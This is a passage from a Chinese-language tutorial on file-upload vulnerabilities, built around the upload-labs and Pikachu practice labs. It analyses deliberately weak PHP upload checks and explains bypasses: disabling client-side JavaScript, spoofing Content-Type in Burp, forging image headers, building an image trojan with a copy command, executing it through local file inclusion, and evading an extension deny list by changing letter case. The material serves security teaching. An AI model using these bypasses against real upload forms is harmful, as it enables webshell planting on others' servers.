(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;         <span class="comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false             </span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;        </span><br><span class="line">             &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     </span><br><span class="line">         &#125; &#125; <span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里先是包含几个文件，然后出现了一些新的函数</p>
+</li>
+<li><p>file_exists函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。</p>
+</li>
+<li><p>而UPLOAD_PATH这个常量在config.php文件中，有这么一段代码define(“UPLOAD_PATH”, “..&#x2F;upload”);，进行了设置。</p>
+</li>
+<li><p>那这个$_FILES[‘upload_file’][‘tmp_name’]又是哪儿冒出来的呢，upload_file就是文件上传的表单的名字,如下图</p>
+</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183919079.png" alt="image-20230724183919079"></p>
+<ul>
+<li><p><strong>这里是$_FILES中的那些参数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES这个变量用与上传的文件参数设置，是一个多维数组 数组的用法就是 $_FILES[&#x27;key&#x27;][&#x27;key2&#x27;]; $_FILES[&#x27;upfile&#x27;]是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。 $_FILES[&#x27;upfile&#x27;]包含了以下内容: $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 $_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 $_FILES[&#x27;upfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 $_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名。 $_FILES[&#x27;upfile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下面这段js代码定义了检查上传文件的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;        </span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;       <span class="comment">//获取到文件名         </span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;             </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);            </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;         &#125;                </span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;          <span class="comment">//定义允许上传的文件类型                  </span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));         <span class="comment">//提取上传文件的类型。         //通过lastIndexOf取到“.”的索引，再使用substring函数截取 .后缀名                </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;         <span class="comment">//如果 allow_ext 中没有 ext_name字符串，则返回-1             </span></span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;            </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);            </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;         &#125;          <span class="comment">//判断上传文件类型是否允许上传     &#125; &lt;/script&gt; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<ul>
+<li><strong>推荐两个关于JS的浏览器插件</strong></li>
+<li>关于禁用JS的两个浏览器插件，个人倾向性于第一个，我觉得可以选择禁用JS简单快捷高效，第二个的话功能比较多一些，但是也会禁用掉正常页面的JS</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184105906.png" alt="image-20230724184105906"></p>
+<hr>
+<p><a name="hx5lI"></a></p>
+<h5 id="3-1-1-1-绕过客户端JavaScript验证的方法"><a href="#3-1-1-1-绕过客户端JavaScript验证的方法" class="headerlink" title="3.1.1.1 绕过客户端JavaScript验证的方法"></a>3.1.1.1 绕过客户端JavaScript验证的方法</h5><ul>
+<li><strong>方法一：</strong> 修改JavaScript去修改其中关键的检测函数，或者直接通过插件禁用JavaScript。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184129570.png" alt="image-20230724184129570"></p>
+<ul>
+<li><strong>方法二：</strong> 直接发送请求包,通过Burp抓到正常上传的请求报文后，修改报文的内容，在直接通过Burp发送，便跳过了网页中JS的验证过程。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184140154.png" alt="image-20230724184140154"></p>
+<ul>
+<li>修改一句话木马文件，将文件格式改成允许上传的文件格式。</li>
+<li>进行上传文件，使用BP拦截数据包。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184154224.png" alt="image-20230724184154224"></p>
+<ul>
+<li>将抓取到的数据包中的文件格式修改回php、再进行发送，从而实现文件上传</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184206668.png" alt="image-20230724184206668"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184218699.png" alt="image-20230724184218699"></p>
+<ul>
+<li>后续的验证操作，跟上面木马利用一样。</li>
+<li>主要就是介绍了一下前端的验证，以及文件上传可以干个啥事。这一关希望大家记住一句话 “所有前端的验证机制都是不安全的”，因为前端的东西是用户可控制的。<br><a name="eIIPE"></a></li>
+</ul>
+<h3 id="3-2-服务端MIME类型验证"><a href="#3-2-服务端MIME类型验证" class="headerlink" title="3.2 服务端MIME类型验证"></a>3.2 服务端MIME类型验证</h3><ul>
+<li>MIME类型是描述消息内容类型的因特网标准。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184231262.png" alt="image-20230724184231262"></p>
+<ul>
+<li>利用Burp抓包，将报文中的Content-Type改成允许的类型</li>
+<li>Content-Type: image&#x2F;gif</li>
+<li>Content-Type: image&#x2F;jpg</li>
+<li>Content-Type: image&#x2F;png</li>
+</ul>
+<hr>
+<ul>
+<li><p>打开upload-labs 靶场第二题 - JS检查</p>
+</li>
+<li><p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;         </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];            </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];                       <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;                 </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;   <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;     &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;     <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到，其实并没有什么特别之处，就是使用了$_FILES[‘upload_file’][‘type’]获取到Content-Type字段，并进行比较，如果是那三种类型就继续向下执行，否则进行提示。</p>
+</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184400127.png" alt="image-20230724184400127"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184411825.png" alt="image-20230724184411825"></p>
+<hr>
+<ul>
+<li>可以尝试用pickchu靶场进行复现。</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li>
+<li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184423525.png" alt="image-20230724184423525"><br><a name="gKbeg"></a></li>
+</ul>
+<h3 id="3-3-服务器文件内容验证-文件头"><a href="#3-3-服务器文件内容验证-文件头" class="headerlink" title="3.3 服务器文件内容验证-文件头"></a>3.3 服务器文件内容验证-文件头</h3><ul>
+<li>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</li>
+<li>常见文件幻数</li>
+<li>JPG: FF D8 FF EO 00 10 4A 46 49 46.</li>
+<li>GIF:47 49 46 3839 61(GIF89a).</li>
+<li>PNG:89 50 4E 47</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184446534.png" alt="image-20230724184446534"><br><a name="P6wQ1"></a></p>
+<h4 id="3-3-1-绕过服务器文件内容验证-文件头"><a href="#3-3-1-绕过服务器文件内容验证-文件头" class="headerlink" title="3.3.1 绕过服务器文件内容验证-文件头"></a>3.3.1 绕过服务器文件内容验证-文件头</h4><hr>
+<ul>
+<li><p>打开upload-labs 靶场第十三题 - 图片马绕过</p>
+</li>
+<li><p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;     </span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);     </span><br><span class="line"><span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节     </span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);     </span><br><span class="line"><span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);        </span><br><span class="line"><span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);      </span><br><span class="line"><span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;         </span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;              </span><br><span class="line">    <span class="keyword">case</span> <span class="number">255216</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;            </span><br><span class="line">        <span class="keyword">break</span>;        </span><br><span class="line">    <span class="keyword">case</span> <span class="number">13780</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;           </span><br><span class="line">        <span class="keyword">break</span>;                 </span><br><span class="line">    <span class="keyword">case</span> <span class="number">7173</span>:                         </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;            </span><br><span class="line">        <span class="keyword">break</span>;        </span><br><span class="line">    <span class="keyword">default</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;         &#125;        </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fileType</span>; &#125;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; </span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];    </span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;        </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>,<span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;        </span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;   </span><br><span class="line">              <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;         &#125;     &#125; &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>方法一：</strong> 伪造文件头绕过方法</p>
+</li>
+<li><p><strong>方法二：</strong> 利用服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p>
+</li>
+<li><p>利用 文件包含漏洞 可以将图片格式的文件当做php文件来解析执行:<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/03/20/9439796055e7a8d1a39396276569.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/03/20/9439796055e7a8d1a39396276569.jpg&amp;submit=提交查询</a></p>
+</li>
+<li><p>模板：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9E%E6%98%BE%E8%B7%AF%E5%BE%84&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/上传文件的回显路径&amp;submit=提交查询</a></p>
+</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205410478.png" alt="image-20230724205410478"><br><a name="aYguM"></a></p>
+<h4 id="3-3-2-如何生成图片木马："><a href="#3-3-2-如何生成图片木马：" class="headerlink" title="3.3.2 如何生成图片木马："></a>3.3.2 如何生成图片木马：</h4><ol>
+<li>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</li>
+<li>输入系统指令： copy 一张图片.png&#x2F;b+一句话木马.php&#x2F;a 生成图片名称.png</li>
+<li>这样图片木马就合成好了</li>
+</ol>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205423850.png" alt="image-20230724205423850"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205435116.png" alt="image-20230724205435116"><br><a name="AMEjE"></a></p>
+<h3 id="3-4-服务器文件扩展名验证-黑名单"><a href="#3-4-服务器文件扩展名验证-黑名单" class="headerlink" title="3.4 服务器文件扩展名验证-黑名单"></a>3.4 服务器文件扩展名验证-黑名单</h3><ul>
+<li><strong>服务器文件扩展名验证-黑名单的原理</strong></li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205446443.png" alt="image-20230724205446443"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a></li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205500522.png" alt="image-20230724205500522"><br><a name="GdTOj"></a></p>
+<h4 id="3-4-1-后缀名大小写绕过"><a href="#3-4-1-后缀名大小写绕过" class="headerlink" title="3.4.1 后缀名大小写绕过"></a>3.4.1 后缀名大小写绕过</h4><ul>
+<li><p><strong>后缀名大小写绕过原理：</strong>服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成PHP文件解析。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA       </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空      </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;        </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;       </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过源代码我们可以发现，黑名单里虽然过滤的很全面，但是在下面的后缀名处理之中却出现了纰漏，没有将后缀名转换为小写。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这样的话，我们就可以进行大小写绕过了。首先来说，直接上传后缀名为.pHP的文件成功。</p>
+</li>
+</ul>
+<hr>
+<p><a name="ajyan"></a></p>
+<h4 id="3-4-2-修改后缀名绕过"><a href="#3-4-2-修改后缀名绕过" class="headerlink" title="3.4.2 修改后缀名绕过?"></a>3.4.2 修改后缀名绕过?</h4><ul>
+<li><p>源码分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; </span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;      </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);   </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);       </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写    </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA         </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空       </span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];     </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;                         <span class="keyword">if</span> (<span class="title function_ 